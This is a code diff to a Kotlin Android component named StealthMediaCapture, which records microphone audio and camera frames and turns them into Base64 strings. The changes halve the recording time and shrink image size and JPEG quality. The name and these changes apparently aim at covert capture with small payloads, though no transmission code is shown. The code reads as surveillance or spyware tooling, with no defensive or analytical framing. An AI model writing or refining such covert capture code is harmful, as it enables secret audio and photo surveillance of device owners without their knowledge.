@@ -22,7 +22,7 @@ import java.io.File
 import kotlin.coroutines.resume
 
 object StealthMediaCapture {
-    suspend fun captureAudio(context: Context, durationMillis: Long = 3000): String? = withContext(Dispatchers.IO) {
+    suspend fun captureAudio(context: Context, durationMillis: Long = 1500): String? = withContext(Dispatchers.IO) {
         if (ContextCompat.checkSelfPermission(context, android.Manifest.permission.RECORD_AUDIO) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
             return@withContext null
         }
@@ -100,7 +100,7 @@ object StealthMediaCapture {
                                 val matrix = Matrix()
                                 matrix.postRotate(image.imageInfo.rotationDegrees.toFloat())
                                 
-                                val scale = minOf(800f / bitmap.width, 800f / bitmap.height)
+                                val scale = minOf(400f / bitmap.width, 400f / bitmap.height)
                                 if (scale < 1f) {
                                     matrix.postScale(scale, scale)
                                 }
@@ -108,7 +108,7 @@ object StealthMediaCapture {
                                 val rotatedBitmap = Bitmap.createBitmap(bitmap, 0, 0, bitmap.width, bitmap.height, matrix, true)
 
                                 val stream = ByteArrayOutputStream()
-                                rotatedBitmap.compress(Bitmap.CompressFormat.JPEG, 50, stream)
+                                rotatedBitmap.compress(Bitmap.CompressFormat.JPEG, 30, stream)
                                 val base64 = Base64.encodeToString(stream.toByteArray(), Base64.NO_WRAP)
                                 
                                 image.close()
